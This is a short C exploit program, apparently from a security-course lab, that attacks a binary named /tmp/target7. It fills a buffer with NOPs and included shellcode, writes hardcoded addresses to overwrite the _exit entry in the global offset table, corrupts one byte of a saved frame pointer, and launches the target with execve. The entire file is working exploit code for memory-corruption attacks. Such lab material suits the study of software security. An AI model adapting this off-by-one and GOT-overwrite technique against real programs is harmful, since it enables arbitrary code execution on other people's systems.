#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target7"

int main(void)
{
  char *args[3];
  char *env[1];
 
  char attack_buffer[201];
 
  memset(attack_buffer, 0x90, 201);
  memcpy(attack_buffer, shellcode, strlen(shellcode));

  // address of _exit in global offset table
  *(unsigned *)(attack_buffer + 0x34) = 0x08049724;

  // address of input shellcode buffer
  *(unsigned *)(attack_buffer + 0x30) = 0xbfffff25;

  // new low order byte of foo's ebp that causes p to become
  // the address of exit
  attack_buffer[200] = 0x08;
  
  args[0] = TARGET; args[1] = attack_buffer; args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
